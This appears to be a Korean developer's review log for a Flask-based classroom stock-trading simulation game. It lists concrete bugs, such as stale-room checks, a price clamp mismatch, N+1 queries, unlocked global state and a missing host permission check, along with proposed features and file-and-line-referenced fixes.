- **`create_room()` stale 체크가 장기 일시정지된 방을 누락** (`app.py:372-379`): `Room.end_time < stale_cutoff` 조건만 검사. 5시간짜리 방을 시작 직후 일시정지하면 `end_time = start_time + 5h`로 미래에 위치해 stale 판정이 영원히 안 됨. 진행자가 새 방을 만들려 해도 "이미 진행 중인 방이 있습니다." 오류가 뜸. `OR (Room.status == 'paused' AND Room.paused_at < stale_cutoff)` 조건을 추가하면 장기 방치된 paused 방도 정리 가능.

- **`confirmLeaveGame()` 메시지가 재입장 가능함을 알리지 않아 학생 혼란** (`app.js:114-117`): `"게임을 나가시겠습니까?\n진행 중인 게임에서 퇴장합니다."` 문구를 보면 영구 퇴장으로 오해. 실제로는 로그아웃 후 동일 학번+이름 재입력 시 `find_active_room()`이 RoomMember를 찾아 자동 복귀(`app.py:307-313`). `"나갔다가 같은 학번+이름으로 다시 들어오면 게임 기록이 유지됩니다."` 한 줄을 confirm 메시지에 추가하면 수업 중 패닉 방지. 1줄 수정.

- **`minigame_spin()`·`submit_quiz()` 에서 주식 청산 시 `h.shares = 0` 으로 설정하고 레코드 삭제 안 함** (`app.py:1037-1038`, `app.py:1318`): 룰렛 베팅 자금 마련이나 퀴즈 패널티로 보유 주식이 전량 청산될 때 `h.shares = 0; h.avg_price = 0`으로 설정하고 `db.session.delete(h)`를 호출하지 않음. `get_portfolio()`(`app.py:782`)에서 `if h.shares <= 0: continue`로 걸러지지만, `RoomHolding.query.filter_by(room_id=rid, user_id=uid).all()` 결과에 빈 레코드가 포함돼 반복문이 불필요하게 확장됨. 두 위치에서 `if sell_value <= shortfall: ... db.session.delete(h)` (또는 `if h.shares == 0: db.session.delete(h)`)로 즉시 삭제 처리.

- **`lobby_members()` 가 `/host/` 경로에 있지만 진행자 권한 검사 없음** (`app.py:577-585`): `GET /api/rooms/<rid>/host/lobby-members`는 `room.host_id != user.id` 체크 없이 누구든 인증만 되면 다른 방 학생 명단 조회 가능. 참가자 로비가 이 엔드포인트를 사용하는 것은 의도된 설계(`app.js:579`)이지만, URL이 `/host/` 하위라 향후 일괄 권한 미들웨어 적용 시 실수로 학생 접근을 차단할 위험이 있음. 엔드포인트를 `/api/rooms/<rid>/lobby-members`로 이동하거나, 현 위치에 진행자 OR 해당 방 멤버 조건을 명시적으로 추가.

---

## 2026-07-01 (2차)

### 추가하면 좋을 기능

- **포트폴리오 도넛 차트에 섹터별 집계 전환 토글 버튼** (`app.js:1480-1502 loadPortfolio()`): 현재 도넛 차트는 보유 종목 단위로 분할돼 종목이 많으면 범례가 좁아져 한눈에 분산투자 비율을 파악하기 어려움. "섹터별 보기" 버튼 클릭 시 `port.holdings`를 `sector → sum(current_value)` 로 그룹화해 Chart.js 데이터만 교체하면 "내가 반도체에 40% 집중됐네"를 즉시 파악 가능. 분산투자 교육 효과 높음. 서버 변경 없음, 클라이언트 Chart destroy/재생성 포함 약 20줄.

- **자산 히스토리를 `localStorage`에 백업해 새로고침·재접속 시 20분 상한 소실 방지** (`app.js:749-752 refreshMyRank()`): `S.assetHistory.shift()`로 120개(10초×120=20분) 초과분이 삭제되어, 2시간짜리 게임에서는 마지막 20분 데이터만 포트폴리오 탭 라인차트(`app.js:1505-1540`)에 남음. 초기 투자 전략과 현재의 대비가 불가능. `refreshMyRank()` 말미에 `localStorage.setItem('ah_' + S.room.id, JSON.stringify(S.assetHistory))`를 추가하고 `enterParticipantGame()`(app.js:589)에서 `JSON.parse(localStorage.getItem(...)) || []`로 복구하면, 새로고침 및 장기 게임 데이터 축적이 가능. 클라이언트 약 5줄, 서버 변경 없음.

- **관심종목 목표 등락률 도달 시 toast 알림** (`app.js:1279-1285 toggleWatchlist()`, `app.js:1313-1323 renderGrid()`): 현재 관심목록(`S.watchlist`)은 필터링에만 사용되고 가격 도달 알림이 없어 수업 중 학생이 계속 화면을 주시해야 함. `toggleWatchlist()` 호출 시 목표 등락률(예: +10%)을 모달로 입력받아 `localStorage`의 `watchAlerts = {SMSNG: 10, TSLA: -5}` 에 저장하고, `renderGrid()` 루프에서 관심종목의 `change_pct`가 목표를 돌파하면 `toast('삼성전자 목표 +10% 도달!')` 1회 발생. `alertFired` 세트로 중복 방지. 서버 변경 없음, 클라이언트 약 25줄.

- **진행자용 풀스크린 랭킹 표시 전용 뷰 `/rooms/<code>/display`** (`app.py:318-320 index()`, `app.js:258-273 enterHostGame()`): 현재 진행자 게임 화면에는 설정·시장·랭킹 탭이 혼재해 프로젝터로 학생들에게 공개하기 어려움. `GET /rooms/<code>/display` 라우트를 추가해 `display.html`(CSS 최소화, 10초 자동 갱신, 조작 UI 없는 풀스크린 랭킹 테이블)을 반환하면, 교사가 별도 브라우저 탭을 열어 프로젝터로 실시간 순위를 학생들에게 공개 가능. Flask 라우트 5줄 + 최소 HTML 60줄.

- **게임 종료 시 최종 보유 종목 스냅샷을 결과 화면에 표시** (`app.py:144-153 _end_room()`, `app.js:1760-1777 loadResults()`): `_end_room()`에서 `RoomHolding`을 전량 삭제(`db.session.delete(h)`, app.py:152)하므로 게임 종료 후 학생이 "내가 어떤 종목을 얼마나 갖고 있었나?"를 복기할 수 없음. 삭제 전 `RoomTransaction(action='SNAP', symbol='PORTFOLIO', note=json.dumps([{'sym': h.symbol, 'shares': h.shares, 'avg': h.avg_price} for h in holdings]))` 한 건을 저장하면, `get_transactions()` 경로로 종료 후에도 최종 포트폴리오 조회 가능. 결과 화면 "내 결과" 카드(`app.js:1762-1774`)에 보유 종목 목록 추가. 서버 약 5줄, 클라이언트 약 15줄.

---

### 제거/단순화할 것들

- **`_next_price()` 클램프 `base×1.4`와 `force_price()` 클램프 `base×3.0` 불일치 → 강제 조정 직후 스냅백 버그** (`stock_service.py:139`, `stock_service.py:225`): 진행자가 `host_force_price(pct=+100)`으로 주가를 base×2.0으로 올리면, 다음 유기 틱(최대 20초 후) `_next_price()`에서 `max(base * 0.6, min(base * 1.4, new_price))` 클램핑에 의해 가격이 base×1.4로 급락. 학생이 "진행자가 방금 올려줬는데 왜 바로 내려가요?"라고 혼란. `stock_service.py:139`의 `min(base * 1.4, ...)` → `min(base * 3.0, ...)`, `max(base * 0.6, ...)` → `max(base * 0.3, ...)` 로 통일하면 2줄 수정으로 강제 조정 범위와 유기 범위가 일치.

- **`lobby_members()` 루프 내 `db.session.get(User, m.user_id)` N+1 SELECT** (`app.py:582-584`): 멤버마다 별도 `SELECT users WHERE id=?` 실행 — 30명 방에서 31회 쿼리. `host_members()`(app.py:548-551)는 이미 `uids = [m.user_id for m in members]; user_map = {u.id: u for u in db.session.query(User).filter(User.id.in_(uids)).all()}` 일괄 조회 패턴을 사용하고 있어 불일치. `lobby_members()`에 동일 4줄 패턴 적용 시 O(N) → O(1) 절감. 5초 폴링에서 30명 접속 시 분당 최대 186회 → 12회로 감소.

- **`openStockModal()` 호출마다 `/portfolio` 전체 재조회** (`app.js:1344-1351`): 학생이 시장 탭에서 여러 종목 카드를 연속 클릭하면 클릭마다 `GET /api/rooms/<rid>/portfolio` 를 호출해 `RoomHolding` + `Deposit` 전체를 DB에서 재조회. `execTrade()` 성공 시 이미 `S.tradeCash`(app.js:1442)·`S.tradeHolding`(1446)이 갱신되므로 재조회가 불필요한 경우가 많음. `S._portfolioCache = {ts: 0, cash: 0, holdings: []}` 를 도입해 30초 이내이면 캐시를 재사용(`if (Date.now() - S._portfolioCache.ts < 30000)`)하고, `execTrade()`·`loadPortfolio()` 성공 시 캐시를 갱신. 클라이언트 약 10줄.

- **`_end_room()` 내 전역 딕셔너리 수정에 잠금 없음 — gunicorn multi-worker 환경에서 상태 불일치** (`app.py:155-161`): `_lots.pop()`, `_rlt_active.pop()`, `_quiz_settings.pop()`, `_roulette_config.pop()`, `_ending_soon.discard()` 모두 잠금 없이 수행. 단일 워커에선 GIL이 어느 정도 보호하지만, `WEB_CONCURRENCY=2+` 시 각 프로세스가 독립 메모리를 가져 "워커 A에서 room 종료 → 워커 B에서 여전히 active로 간주"하는 상태 불일치 발생. 현재 `render.yaml`·`Procfile` 어디에도 단일 워커 제약 명시 없음. `app.py:12` 주석 또는 `Procfile`에 `web: gunicorn app:app --workers 1 --threads 4`를 명시해 인메모리 전역 상태 공유 보장. 장기적으로는 `_lots`, `_rlt_active` 등을 Redis로 이전 권장.

- **`get_history()` X축 날짜가 실제 캘린더 날짜여서 30분 게임과 맥락 불일치** (`stock_service.py:296-302`): `date_str = datetime.utcfromtimestamp(now - i * 86400).strftime('%Y-%m-%d')` 로 "2026-06-01"~"2026-07-01" 같은 실제 날짜가 차트 X축에 표시됨. 30분짜리 게임에서 학생이 "1달 차트"를 보면 지난 달 날짜들이 보이므로 "이게 실제 주가 데이터인가요?"라는 혼동 유발. `date_str = f"T-{i}"`나 `f"라운드 {n_bars - i}"` 같은 상대 레이블로 교체하면 1줄 수정으로 "이건 가상 시뮬레이션 데이터" 임을 명확히 전달 가능.

- **`Room.query.get_or_404(rid)` — Flask-SQLAlchemy 3.1+에서 `LegacyAPIWarning` 발생, 코드베이스 13곳** (`app.py:435, 478, 492, 507, 523, 543, 566, 580, 591, 610, 675, 693, 713`): `cur_user()`(app.py:105)·`withdraw_deposit()`(app.py:907) 등 최신 추가 코드는 이미 `db.session.get(Model, pk)` 를 사용하고 있어 동일 파일 내 일관성이 없음. `Room.query.get_or_404(rid)` → `db.get_or_404(Room, rid)` (Flask-SQLAlchemy 3.1 공식 API)로 일괄 교체하면 경고 제거 + 스타일 통일. `sed -i "s/Room\.query\.get_or_404(rid)/db.get_or_404(Room, rid)/g" app.py` 한 줄로 13곳 자동 치환 가능.
